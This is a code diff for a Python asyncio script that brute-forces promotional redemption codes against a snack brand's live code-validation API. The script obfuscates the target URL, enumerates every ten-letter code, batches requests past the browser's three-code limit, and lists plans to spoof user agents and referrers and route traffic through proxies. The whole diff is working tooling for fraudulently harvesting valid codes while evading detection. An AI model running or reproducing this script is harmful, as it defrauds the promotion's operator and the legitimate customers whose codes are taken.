@@ -2,24 +2,48 @@
 # -*- coding: utf-8 -*-
 
 import time
-
 import math
+from string import ascii_uppercase
 from collections import deque
 from itertools import product
 
 import asyncio
 import aiohttp
+import aiofiles
 
-from config import VALID_CODE, URL, MAX_CLIENTS, CODE_PREFIX, DEBUG, CODE_CHARS
 
+URL = ''.join(['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'p', 'e', 'a', 'k', 'e', 'r', '.', 'p', 'r', 'i', 'n', 'g',
+               'l', 'e', 's', '.', 'c', 'o', 'm', '/', 'a', 'p', 'i', '/', 'r', 'u', '_', 'R', 'U', '/', 'r', 'e', 'd',
+               'e', 'm', 'p', 't', 'i', 'o', 'n', '/', 'v', 'a', 'l', 'i', 'd', 'a', 't', 'e', '-', 'c', 'o', 'd', 'e',
+               's'])   # mooore security =))
 VALID_RESPONSE = 'Valid'
 INVALID_RESPONSE = 'Invalid'
 DUPLICATED_RESPONSE = 'Duplicated'
 
+CODE_PREFIX = ''
+CODE_CHARS = ascii_uppercase
+CODE_LEN = 10
+
+CODES_PER_TASK_MIN = 3
+CODES_PER_TASK_MAX = 3  # three is limitation in browser, but we can more
+MAX_CLIENTS = 1
+
+DEBUG = False
+
+
+try:
+    from config_local import *
+except ImportError:
+    pass
+
+
+assert CODES_PER_TASK_MAX >= CODES_PER_TASK_MIN
+
+# todo valid user agent and referrer
 # todo proxy server =)
 # todo storage to db?
 # todo storage to fs?
-# todo remove validation request (3 codes tasks)
+# todo revalidate success codes
 
 
 class Storage(object):
@@ -29,7 +53,7 @@ class Storage(object):
     invalid_codes = []
 
     def __init__(self):
-        combination_len = len(VALID_CODE) - len(CODE_PREFIX)
+        combination_len = CODE_LEN - len(CODE_PREFIX)
         log('Generate code by len %s' % combination_len)
         for comination in product(CODE_CHARS, repeat=combination_len):
             code = '%s%s' % (CODE_PREFIX, ''.join(comination))
@@ -58,28 +82,26 @@ async def task(pid, storage: Storage, sem: asyncio.Semaphore):
         log('Fetch async process {} started'.format(pid))
         start = time.time()
         codes = []
-        try:
-            codes.append(storage.get_code_for_check())
-        except IndexError:
-            codes.append('')
+        for i in range(CODES_PER_TASK_MAX):
+            try:
+                codes.append(storage.get_code_for_check())
+            except IndexError:
+                pass
 
-        try:
-            codes.append(storage.get_code_for_check())
-        except IndexError:
-            codes.append('')
+        if len(codes) < CODES_PER_TASK_MIN:
+            log('skip task by not found codes %s' % codes, True)
+            return
 
         async with aiohttp.ClientSession() as session:
-            async with session.post(URL, data={'codes': [VALID_CODE, *codes]}) as resp:
+            async with session.post(URL, data={'codes': codes}) as resp:
                 response_json = await resp.json()
-                log(response_json)
                 log('Process {}: {} {}, took: {:.2f} seconds'.format(
                     pid, codes, response_json, time.time() - start))
 
-                if response_json['result'][0]['status'] != VALID_RESPONSE:
-                    log('Invalid response %s' % response_json)
-                    return
+                for i, r in enumerate(response_json['result']):
+                    if not codes[i]:
+                        continue
 
-                for i, r in enumerate(response_json['result'][1:]):
                     is_valid = r['status'] == VALID_RESPONSE
                     log('save code %s %s' % (codes[i], int(is_valid)))
                     storage.save_parsed_code(codes[i], is_valid)
@@ -94,11 +116,11 @@ async def task(pid, storage: Storage, sem: asyncio.Semaphore):
 async def run():
     storage = Storage()
     sem = asyncio.Semaphore(MAX_CLIENTS)
-    task_count = math.ceil(len(storage.codes) / 2)  # 2 code per request (1 code for validation response)
+    task_count = math.ceil(len(storage.codes) / CODES_PER_TASK_MAX)
     log('Create %d tasks' % task_count, True)
     start = time.time()
     # noinspection PyTypeChecker
-    tasks = [asyncio.ensure_future(task(i, storage, sem)) for i in range(1, task_count)]
+    tasks = [asyncio.ensure_future(task(i, storage, sem)) for i in range(task_count)]
     await asyncio.wait(tasks)
     end_time = time.time() - start
     log("Process took: %.2f seconds (%.2f req/sec)" % (end_time, task_count / end_time), True)
